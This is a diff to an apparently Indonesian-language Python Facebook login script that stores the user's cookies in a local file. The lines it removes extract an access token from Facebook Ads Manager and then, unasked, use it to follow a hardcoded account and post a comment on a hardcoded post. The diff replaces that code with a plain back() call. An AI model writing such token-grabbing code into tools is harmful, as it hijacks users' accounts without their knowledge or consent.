@@ -430,21 +430,7 @@ def login_lagi334():
 							cook= open(".cok.txt","w").write(your_cookies)
 							Console().print("[bold cyan]   ╰─> [bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]");time.sleep(5)
 							time.sleep(3)
-							try:
-								with requests.Session() as xyz:
-									cok = ({'cookie': your_cookies})
-									url = 'https://www.facebook.com/adsmanager/manage/campaigns'
-									req = xyz.get(url,cookies=cookie)
-									set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
-									nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
-									roq = xyz.get(nek,cookies=cookie)
-									tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-									print('')
-									print(tok)
-									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok))
-									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom1}&access_token={tok}", headers = {"cookie":your_cookies})
-							except Exception as e:
-								print(e)
+							back()
 			except Exception as e:
 				Console().print(f"[bold cyan]   ╰─>[bold red] Cookies Mokad Bang")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
@@ -452,6 +438,7 @@ def login_lagi334():
 				time.sleep(3)
 				exit()
 	except:pass
+						
 
 
 
